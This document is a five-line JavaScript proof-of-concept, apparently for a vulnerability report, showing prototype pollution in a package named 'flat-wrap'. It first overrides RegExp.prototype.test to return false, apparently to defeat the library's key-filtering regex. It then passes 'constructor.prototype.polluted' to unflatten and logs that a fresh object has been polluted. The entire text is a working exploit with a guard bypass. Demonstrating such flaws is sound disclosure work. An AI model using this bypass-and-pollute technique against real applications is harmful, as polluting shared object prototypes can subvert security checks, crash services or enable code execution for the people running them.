RegExp.prototype.test = () => false;
const {unflatten} = require('flat-wrap');
console.log({}.polluted);
unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);